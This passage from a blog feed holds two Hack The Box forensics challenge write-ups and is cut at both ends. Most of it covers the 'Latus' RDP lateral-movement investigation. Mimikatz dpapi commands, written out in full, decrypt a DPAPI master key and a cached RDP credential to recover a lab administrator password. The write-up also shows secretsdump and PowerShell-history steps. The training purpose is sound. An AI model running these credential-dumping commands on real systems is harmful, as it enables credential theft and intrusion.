tabs).</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/41.png" sizes="95vw"/> <img src="/assets/img/nuts/41.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 41 </div> <p>Googling the hash returned nothing for me, but searching it on Duck-Duck-Go returned a <a href="https://www.joesandbox.com/analysis/1275269/0/html">JoeSandbox report</a> containing its malware family name in the <em>Tags</em> field.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/42.png" sizes="95vw"/> <img src="/assets/img/nuts/42.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 42 </div> <h2 id="task-19-when-was-the-file-dropped-onto-the-system-provide-the-timestamp-in-utc">Task 19: When was the file dropped onto the system? Provide the timestamp in UTC.</h2> <p>This question is referring to <code class="language-plaintext highlighter-rouge">updater.exe</code> again. I headed back to the USN Journal to see the entry for when <code class="language-plaintext highlighter-rouge">file.exe</code> was created (Fig. 43).</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/43.png" sizes="95vw"/> <img src="/assets/img/nuts/43.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 43 </div> <h2 id="conclusion">Conclusion</h2> <p>I really enjoyed completing this Sherlock. I thought it maintained a good balance between approachability and complexity. Nothing felt too out of reach, but there were times that I made mistakes and went down rabbit holes that were unnecessary. My biggest takeaway is that I need to keep an eye out for UTF-16 encoded text/log files on Windows images and not fully rely on vanilla grep to find things in files for me.</p> <p>It was also cool to be able to “pull back the curtain” on the CTF and see that Sysmon logs had existed but were not deleted by the attacker, leading to the conclusion that they were not included on the image on purpose to make the challenge a bit harder.</p> <p>Thanks for reading! If you have any questions or comments, feel free to reach out or follow <a href="https://x.com/its_rad_io">me on X</a></p>]]></content><author><name></name></author><category term="Write-Ups"/><category term="forensics"/><category term="medium"/><category term="sherlock"/><category term="HackTheBox"/><summary type="html"><![CDATA[A write-up for Hack The Box's forensics challenge 'Nuts'. This challenge focuses primarily on file forensics, with the evidence consisting solely of a forensic image of a targetted filesystem.]]></summary></entry><entry><title type="html">HTB Write-Up | Hard Sherlock | Latus</title><link href="https://its-radio.github.io/blog/2024/latus-write-up/" rel="alternate" type="text/html" title="HTB Write-Up | Hard Sherlock | Latus"/><published>2024-12-15T00:00:00+00:00</published><updated>2024-12-15T00:00:00+00:00</updated><id>https://its-radio.github.io/blog/2024/latus-write-up</id><content type="html" xml:base="https://its-radio.github.io/blog/2024/latus-write-up/"><![CDATA[<style>.small-margin>*{margin-bottom:.1rem}</style> <h2 id="introduction">Introduction</h2> <p>This is a write-up for Hack The Box’s Sherlock challenge <strong>Latus</strong>, which is rated as <strong>Hard</strong>. It was relatively difficult, as reflected by the fact that I was only the 42nd person to solve it after it had been out for several months. For context, an easy Sherlock that I did a write-up for had something like 75 solves the day after it came out and now, a few months later, it has over 1000 solves.</p> <p>That being said, I think this is a great challenge and I would encourage anyone to jump into a challenge like this one. I think diving in a little over your head in digital forensics is a fantastic way to learn and expose yourself to new topics.</p> <p>For this demo I’m using one machine running Fedora 40 and one running Windows 11 depending on the tools I need to access different information.</p> <h3 id="the-scenario">The Scenario</h3> <p>As always with CTFs, let’s start by carefully reading the scenario description to see what we are working with.</p> <p><em>“Our customer discovered illegal RDP sessions without Privileged Access Management (PAM) in their system on June 28. They collected evidence on a server they suspected was an intermediary server to move laterally to others. Even though the attacker deleted the event log, I believe the few remaining artifacts are enough to help confirm the attack flow and trace the attacker’s behavior.”</em></p> <p>What do we learn here?</p> <ol> <li>The initial malicious activity that was noted were RDP sessions, giving us a protocol to focus on.</li> <li>The activity we are interested in was discovered on June 28th, so we should start with evidence that fits that timeframe.</li> <li>The customer suspects that the target server was being used as a pivot host, implying it wasn’t the attacker’s ultimate objective.</li> <li>The event logs have been deleted, so we will be working with other types of forensic evidence, not logs.</li> </ol> <h3 id="the-evidence">The Evidence</h3> <p>Now let’s take a look at the evidence. If you are having trouble with the basics like downloading and decompressing the evidence, take a look at the beginning of <a href="/blog/2024/Compromised-Write-Up/">this other post</a> where I describe how to do that.</p> <p>After decompressing the evidence, we’re left with a single file: <code class="language-plaintext highlighter-rouge">evidence.ad1</code></p> <div class="row mt-3"> <div class="col-sm-8 mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/latus/4.png" sizes="95vw"/> <img src="/assets/img/latus/4.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>Full transparency, even after completing the entire CDSA course from HTB and completing a masters degree in cybersecurity, I had not heard of .ad1 files. In fact, I double checked the CDSA course to make sure I hadn’t missed it and “.ad1” doesn’t come up in a search of the materials on HTB Academy.</p> <p>Nothing that a quick google search can’t fix though. It turns out that .ad1 is an extension used for a proprietary format, similar to a container according to <a href="https://dfir.science/2021/09/What-is-an-AD1.html">DIFR Science</a>. No need to get into the nitty gritty here, but it should suffice to say that it is a type of forensic image and we will need some specific software to be able to interact with it.</p> <p>To open <code class="language-plaintext highlighter-rouge">evidence.ad1</code> we will need to use FTK Imager, which can be found in Exterro’s <a href="https://www.exterro.com/ftk-product-downloads">downloads section</a>. It needs to be installed on Windows. You could probably run it on Linux via Wine, but for simplicity’s sake, I just booted up a windows system and installed it there.</p> <p>Once you open up FTK Imager, just <strong>file -&gt; Add Evidence Item</strong>. In the pop-up window, select <strong>Image File -&gt; next</strong>, then browse to wherever you <code class="language-plaintext highlighter-rouge">evidence.ad1</code> and click finish. Expand the tabs on the left-hand side to see the image contents. It should look like this upon loading in correctly.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/latus/6.png" sizes="95vw"/> <img src="/assets/img/latus/6.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>From here, it’s possible to browse the contents of the image to some extent and export certain files if closer examination is necessary. We are ready to hop into Task 1.</p> <h2 id="task-1-when-was-the-last-failed-logon-attempt-using-emmant-user--utc">Task 1: When was the last failed logon attempt using <strong>emman.t</strong> user? (UTC)</h2> <p>Normally, this would be where I reach for Windows Security logs and look for Event ID 4625s, but as the description said, the attackers deleted the logs. I checked the logs nonetheless just to make sure. While there actually are a few entries in the logs on the forensic image, there is nothing there to answer this question.</p> <p>Okay, so where else might there be evidence of failed logons? The SAM (Security Account Manager) Hive in the registry holds information related to accounts, including a limited amount of their logon activity. I exported the SAM hive like this:</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/latus/10a.png" sizes="95vw"/> <img src="/assets/img/latus/10a.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>It is also worth exporting the <code class="language-plaintext highlighter-rouge">SAM.LOG1</code> and <code class="language-plaintext highlighter-rouge">SAM.lOG2</code> files from the same directory as they store transaction information for the SAM hive and can allow us to see, for example, registry keys and values that have been deleted.</p> <p>Then I opened it using the <em>Registry Explorer</em> from Eric Zimmerman’s (EZ) <em>EZ-Tools</em> suite. If you don’t have them, I’d recommend just using his script provided in the <em>Get-ZimmermanTools.zip</em> that is available on his <a href="https://ericzimmerman.github.io/#!index.m">github pages site</a>.</p> <p>I loaded the SAM hive into <em>Registry Explorer</em>, then poked around a bit. At first I wasted some time searching through paths to information about individual users, but the answer turned out to be in a more obvious spot–directly in <code class="language-plaintext highlighter-rouge">SAM\Domains\Accounts\Users</code>.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/latus/11.png" sizes="95vw"/> <img src="/assets/img/latus/11.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <h2 id="task-2-what-are-the-first-3-ip-addresses-that-emmant-connected-to-using-remote-desktop-rdp">Task 2: What are the first 3 IP addresses that emman.t connected to using Remote Desktop (RDP)?</h2> <p>Sticking with the registry, RDP information in the registry is stored under the name <em>Terminal Server Client</em>. I first looked in the SOFTWARE Hive to no avail. However, it turned out that the information I was after was stored in <strong>**emman.t</strong>**’s personal hive, <code class="language-plaintext highlighter-rouge">NTUSER.DAT</code>. Each user has such a hive located in their home directory to store personal registry items.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/latus/11a.png" sizes="95vw"/> <img src="/assets/img/latus/11a.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p><strong>Note about the <code class="language-plaintext highlighter-rouge">&lt;hive&gt;.LOG1</code> &amp; <code class="language-plaintext highlighter-rouge">&lt;hive&gt;.LOG2</code> files:</strong> <em>When you load a hive, Registry Explorer should prompt you if you need to use the log files to replay the transaction history. If it prompts you, just go ahead and do it and save the new “clean” version too for later use. It will also ask you if you want to view the “dirty” version of the hive. You really don’t have to unless you specifically want to compare before and after the transaction logs replay. Just view the “clean” versions most of the time.</em></p> <p>After loading it into Registry Explorer as before, we can see the locate <em>Terminal Server Client</em> at <code class="language-plaintext highlighter-rouge">NTUSER.DAT/SOFTWARE/Microsoft/Terminal Server Client</code>. I found the IPs listed in the <code class="language-plaintext highlighter-rouge">Server</code> key. There are a lot of times, so it’s useful here to just sort by time and take the earliest three.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/latus/15.png" sizes="95vw"/> <img src="/assets/img/latus/15.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <h2 id="task-3-what-is-the-destination-username-used-to-remote-desktop-to-for-the-first-time-on-2024-06-20-160105-utc">Task 3: What is the destination username used to remote desktop to for the first time on 2024-06-20 16:01:05 UTC?</h2> <p>Another RDP question and we’re already in the right place! Just look for the matching timestamp in the list of IPs from the last question and look at its subkeys. One of the values should jump out as looking like a username.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/latus/16.png" sizes="95vw"/> <img src="/assets/img/latus/16.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <h2 id="task-4-what-is-the-destination-ip-address-of-the-last-remote-desktop-rdp-session">Task 4: What is the destination IP address of the last Remote Desktop (RDP) session?</h2> <p>Yet another RDP question that is answerable from this location. Sort by time in the other direction this time to see the last RDP session.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/latus/17.png" sizes="95vw"/> <img src="/assets/img/latus/17.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>I’m not sure why the answer is the one that takes place on 2024-06-26 rather than the one that takes place on 2024-06-28, which is clearly a later time. Was this just HTB messing up or is there an explanation for this? If you know, reach out to <a href="https://x.com/its_rad_io">me on X</a> and let me know your theory.</p> <h2 id="task-5-emmant-is-very-careless-in-always-saving-rdp-credentials-to-connect-to-other-hosts-so-we-believe-that-attacker-somehow-leaked-them-please-confirm-credentials-of-the-server-with-ip-19216870133-that-was-leaked">Task 5: emman.t is very careless in always saving RDP credentials to connect to other hosts, so we believe that attacker somehow leaked them. Please confirm credentials of the server with ip 192.168.70.133 that was leaked?</h2> <p>Man, this one threw me for a loop for the longest time. In fact, during my initial solve, this was chronologically the last Task that I solved.</p> <p>First I identified which credentials I was meant to be looking for. For that it’s back (yet again) to the <strong>**emman.t</strong>**’s Terminal Client Server key\Servers key. Examine the subkeys of 192.168.70.133 to find the username of the account the question is asking about: <code class="language-plaintext highlighter-rouge">HQ-DOM-03\Administrator</code>.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/latus/27a.png" sizes="95vw"/> <img src="/assets/img/latus/27a.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>Even though some of the following methods didn’t lead directly to a correct answer, I’ll list a few techniques that I tried before landing on the path that worked. Not only were they worth trying, but some of them resulted in information that was important in determining how to proceed in this task and others.</p> <p>Before starting this, I mass exported everything from the <code class="language-plaintext highlighter-rouge">evidence.ad1</code> image and moved it back to a Linux machine so that I could more easily search through the contents of files.</p> <h3 id="1-i-used-various-grep-and-strings-methods-to-search-through-the-files-for-keywords">1. I used various <code class="language-plaintext highlighter-rouge">grep</code> and <code class="language-plaintext highlighter-rouge">strings</code> methods to search through the files for keywords.</h3> <p>Here, I grep for files that contain ‘Administrator’, then dump the strings of those files (since many were binary files), pipe the result back to grep, search for ‘Administrator’ again, returning 20 lines on either side of a match, and then search for instances of ‘password’ in those results. I did a bunch of variations of this type of search.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/latus/21.png" sizes="95vw"/> <img src="/assets/img/latus/21.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>Since the question is asking about <strong>emman.t</strong>, I also spent some time filtering for that username to see where it came up in files andI ended up finding some very interesting results in <code class="language-plaintext highlighter-rouge">consoleHost_history.txt</code> which is a powershell log stored at:</p> <pre><code class="language-plain">C:\Users\&lt;user&gt;\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
</code></pre> <p>This is what it showed for user <strong>emman.t</strong>:</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/latus/26.png" sizes="95vw"/> <img src="/assets/img/latus/26.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>What the above image shows is the <strong>emman</strong> user being created with the password <strong>emman2024</strong>. That’s very interesting, but those aren’t the credentials we are asked for in this question. Still, note them for later.</p> <p>While searching for “192.168.70.133”, “rdp”, “terminal client server”, “tsc”, etc. I ran across the following interesting files. They may play a part later:</p> <ol> <li>C:/Users/emman.t/Documents/Default.rdp</li> <li>C:/Users/emman/Documents/Default.rdp</li> <li>C:/Users/emman.t/AppData/Local/Microsoft/Terminal Server Client/Cache/Cache0000.bin</li> <li>C:/Users/emman.t/AppData/Local/Microsoft/Terminal Server Client/Cache/Cache0001.bin</li> <li>C:/Users/emman.t/AppData/Local/Microsoft/Terminal Server Client/Cache/Cache0002.bin</li> </ol> <h3 id="2-i-ran-secrectsdumppy-a-part-of-impacket-to-dump-credentials-from-the-registry">2. I ran secrectsdump.py (a part of <a href="https://github.com/fortra/impacket">Impacket</a>) to dump credentials from the registry</h3> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/latus/27.png" sizes="95vw"/> <img src="/assets/img/latus/27.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>Even though we can’t directly see the passwords, we can still glean some information. The LM hashes all have an empty value, indicating that LM hashing is disabled. This is good from a defensive point of view because LM hashes are very weak and vulnerable to brute force or rainbow table attacks. More importantly though we can see the <strong>emman</strong> and <strong>emman.t</strong> have the exact same NT hash, meaning that their passwords are the same as each other. Since we know <strong>emman</strong>’s password is <strong>emman2024</strong>, we now know that must be <strong>emman.t</strong>’s password as well.</p> <h3 id="3-i-looked-in-the-mft-to-see-which-files-were-accessed-around-the-time-of-the-last-session-with-19216870133">3. I looked in the $MFT to see which files were accessed around the time of the last session with 192.168.70.133</h3> <p>The Master File Table (MFT) stores file metadata and EZ-Tools includes some tools that make the MFT easy to parse. The MFT can contain evidence all on its own, but I often find myself using it as a quick way to query the file system to see if different files exist, where they reside on the filesystem, or when they were last edited or accessed. For this purpose I use EZ’s <em>Timeline Explorer</em></p> <p>First, you need to create a .csv file from the <strong>$MFT</strong> using EZ’s <code class="language-plaintext highlighter-rouge">MFTECmd.exe</code> like this:</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">.</span><span class="n">\MFTECmd.exe</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="s1">'C:\Users\&lt;user&gt;\Desktop\HackTheBox\latus\ftk-file-export\C___NONAME [NTFS]\C\$MFT'</span><span class="w"> </span><span class="nt">--csv</span><span class="w"> </span><span class="nx">C:\Users\</span><span class="err">&lt;</span><span class="nx">user</span><span class="err">&gt;</span><span class="nx">\Desktop\HackTheBox\latus\</span><span class="w"> </span><span class="nt">--csvf</span><span class="w"> </span><span class="nx">mft.csv</span><span class="w">
</span></code></pre></div></div> <p>Make sure to replace the paths with your own.</p> <p>Next, open the new .csv file up in EZ’s <em>Timeline Explorer</em>. Now we have a timeline showing when all the files were last edited, accessed, etc., but what time are we interested in? Specifically, we are interested in the time around the last RDP session with 192.168.70.133. We actually already know that time from the first screenshot in this Task (Task 5). The record about the session was written to the registry at time <code class="language-plaintext highlighter-rouge">2024-06-26 08:34:08</code>.</p> <p>Our hypothesis is that around this time credentials must have been accessed somehow to initiate the session, so if we can identify which files were accessed at this time, we should be able to narrow down the possible locations of the credentials.</p> <p>Navigating near <code class="language-plaintext highlighter-rouge">2024-06-26 08:34:08</code> in Timeline Explorer, I noticed some files with ‘credentials’ in their path. Time correlated credential access. Interesting.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/latus/25.png" sizes="95vw"/> <img src="/assets/img/latus/25.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>A credential was cached on the system just seconds before the record on 192.168.70.133 was written to the registry. It is a pretty good bet that this file will contain the credential we are looking for. It’s just a matter of finding a way to decrypt the credential file’s contents.</p> <h3 id="4-finally-i-researched-the-credential-type-extracted-it-using-mimikatz-and-finished-the-task">4. Finally, I researched the credential type, extracted it using Mimikatz, and finished the Task</h3> <p>DPAPI is the Data Protection API and is responsible for encrypting and storing credentials that need to be cached for each user. It’s been a while since I learned about DPAPI, so I read up on it and how to extract credentials from DPAPI-encrypted files on <a href="https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html">HackTricks</a> among other sources. This <a href="https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107">excellent post</a> by Will Schroeder of SpecterOps really gave me what I needed to tackle the rest of this Task.</p> <p>Here is what I learned: Credential files each store a single credential and are encrypted using the user’s password regardless of the credential they store. That’s good news for two reasons. First, it means that the credential file that is time-correlated with the RDP session likely holds only the credential we are looking for. Second, we already have the user’s password. Remember? This credential is associated with <strong>emman.t</strong>. We found <strong>emman</strong>’s password in <code class="language-plaintext highlighter-rouge">consoleHost_history.txt</code> and then later noticed that his NT hash matched <strong>emman.t</strong>’s, revealing his password. We have the encrypted credential file, we have <strong>emman.t</strong>’s encrypted master key files, and we have the password that should decrypt the master keys. Let’s get hacking.</p> <p>It turns out that <a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a> has the ability to dump the credentials from a DPAPI-encrypted credential. Extracting it felt a bit complicated at first but it really is not too bad once it’s broken down. Accessing the password stored in the credential file requires a DPAPI master key. Accessing the DPAPI master key requires the password of the user for whom the credential file was made (i.e. <strong>emman.t</strong>), not the user whose credentials are store in the credential file (i.e. <strong>HQ-DOM-03\Administrator</strong>). The layers of encryption look something like this:</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/latus/25a.png" sizes="95vw"/> <img src="/assets/img/latus/25a.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>We already know <strong>emman.t</strong>’s password, so we can decrypt the master key, and if we can do that, then we should be able to decrypt the credential file.</p> <p>Windows Credential Manager cached credentials are stored here:</p> <pre><code class="language-plain">C:\Users\&lt;user&gt;\AppData\Local\Microsoft\Credentials\
</code></pre> <p>The one we are interested in (identified by timestamp in the MFT) is this one:</p> <pre><code class="language-plain">C:\Users\emman.t\AppData\Local\Microsoft\Credentials\063D7EF36287654137F1E552FF79E61E
</code></pre> <p>DPAPI keys are cached here:</p> <pre><code class="language-plain">C:\Users\&lt;user&gt;\AppData\Roaming\Microsoft\Protect\&lt;user SID&gt;\
</code></pre> <h4 id="identify-the-dpapi-master-key">Identify the DPAPI master key</h4> <p>We don’t know which one we need yet, but Mimikatz will help us identify the correct one. Run the Mimikatz CLI on the machine where you have stored the files dumped from the forensic image. Use the following command (as always, remember to adjust the paths for your environment):</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">dpapi::cred</span><span class="w"> </span><span class="nx">/in:</span><span class="s2">"C:\&lt;path to files from forensic image&gt;\C\Root\Users\emman.t\AppData\Local\Microsoft\Credentials\063D7EF36287654137F1E552FF79E61E"</span><span class="w">
</span></code></pre></div></div> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/latus/25b.png" sizes="95vw"/> <img src="/assets/img/latus/25b.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>We can identify the master key that we care about from the output:</p> <pre><code class="language-plain">C\root\Users\emman.t\AppData\Roaming\Microsoft\Protect\S-1-5-21-1281496067-1440983016-2272511217-1000\ac986fb1-8431-4749-bc7b-92ecdf5d7d64
</code></pre> <h4 id="dump-the-master-key">Dump the master key</h4> <p>Still in Mimikatz, dump the master key using the following command:</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">dpapi::masterkey</span><span class="w"> </span><span class="nx">/in:</span><span class="s2">"C:\&lt;path to files from forensic image&gt;\C\root\Users\emman.t\AppData\Roaming\Microsoft\Protect\S-1-5-21-1281496067-1440983016-2272511217-1000\ac986fb1-8431-4749-bc7b-92ecdf5d7d64"</span><span class="w"> </span><span class="nx">/password:emman2024</span><span class="w"> </span><span class="nx">/protected</span><span class="w">
</span></code></pre></div></div> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/latus/25c.png" sizes="95vw"/> <img src="/assets/img/latus/25c.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <h4 id="dump-the-credential-file">Dump the credential file</h4> <p>Mimikatz is pretty smart, so it caches the master key in memory and will just apply it to other times you run <code class="language-plaintext highlighter-rouge">dpapi::cred</code> within the same session, so you can just rerun:</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">dpapi::cred</span><span class="w"> </span><span class="nx">/in:</span><span class="s2">"C:\&lt;path to files from forensic image&gt;\C\Root\Users\emman.t\AppData\Local\Microsoft\Credentials\063D7EF36287654137F1E552FF79E61E"</span><span class="w">
</span></code></pre></div></div> <p>And it should dump the credential. If you got kicked out of the session somehow or you aren’t using the CLI, the full command to dump the cred when the master key isn’t cached in memory is:</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">dpapi::cred</span><span class="w"> </span><span class="nx">/in:</span><span class="s2">"C:\Users\Gloria Cuthbertson\Desktop\Exception\C\Root\Users\emman.t\AppData\Local\Microsoft\Credentials\063D7EF36287654137F1E552FF79E61E"</span><span class="w"> </span><span class="nx">/masterkey:5902689a5601048b83a7858a842c20d79abff55d82c6d1a35148cc97533760b212d2354057fe3bbdb4d8fdf0ea6fdd1aa79d8bef0101136ebad6ce0eb73e93e8</span><span class="w">
</span></code></pre></div></div> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/latus/25d.png" sizes="95vw"/> <img src="/assets/img/latus/25d.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>As shown above, the password is <strong>C@mv@0s3rv3r</strong></p> <h2 id="task-6-when-was-the-last-time-the-remote-desktop-connection-application-was-executed-utc">Task 6: When was the last time the Remote Desktop Connection application was executed? (UTC)</h2> <p>For this we have to identify the final time that the RDP application was executed. Keep in mind that executing it doesn’t necessarily mean that a connection was started at that time.</p> <p>The executable responsible for running RDP connections is called <code class="language-plaintext highlighter-rouge">mstsc.exe</code>. I threw all the files that I extracted from the forensic image into <a href="https://www.autopsy.com/">Autopsy</a>, a powerful forensics toolkit. Autopsy has a ‘Run Programs’ section, which shows the times at which applications were executed. Sort these by name to group all the <code class="language-plaintext highlighter-rouge">mstsc.exe</code>s, then compare them to find the latest time.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/latus/25e.png" sizes="95vw"/> <img src="/assets/img/latus/25e.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>This result is correlated with the last-access time of the RDP config file for <strong>emman.t</strong>.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/latus/25f.png" sizes="95vw"/> <img src="/assets/img/latus/25f.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <h2 id="task-7-when-was-the-last-time-the-remote-desktop-connection-application-was-terminated-utc">Task 7: When was the last time the Remote Desktop Connection application was terminated? (UTC)</h2> <p>For this one I headed back to the <strong>$MFT</strong>. I figured that an application’s .exe file might be last accessed at the time that it was terminated. Pursuing this, I searched the <strong>$MFT</strong> for <code class="language-plaintext highlighter-rouge">mstsc.exe</code> and looked at its last-accessed timestamp. It also should feasibly match up with the previous answer. That is, it shouldn’t be too much after <code class="language-plaintext highlighter-rouge">2024-06-28 HH:MM:SS</code>.</p> <p>We actually don’t find that specifically <code class="language-plaintext highlighter-rouge">mstsc.exe</code> has been has been accessed, near that time, but one of its resource files, <code class="language-plaintext highlighter-rouge">mstsc.exe.mun</code> was last accessed at <code class="language-plaintext highlighter-rouge">2024-06-28 HH:MM:SS</code> few minutes after the last time that <code class="language-plaintext highlighter-rouge">mstsc.exe</code> was executed.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/latus/35.png" sizes="95vw"/> <img src="/assets/img/latus/35.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption"> The above image shows the timestamp associated with the mstsc.exe.mun files. </div> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/latus/35.png" sizes="95vw"/> <img src="/assets/img/latus/35.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption"> The above image shows file names referenced in the previous image's caption. </div> <p>Now, I’ll be the first to admit that this answer is based on some shakey logic and guess work. I do not definitively know why it is that the timestamp associated with this particular instance <code class="language-plaintext highlighter-rouge">mstsc.exe.mun</code> in $MFT is the answer, and not the 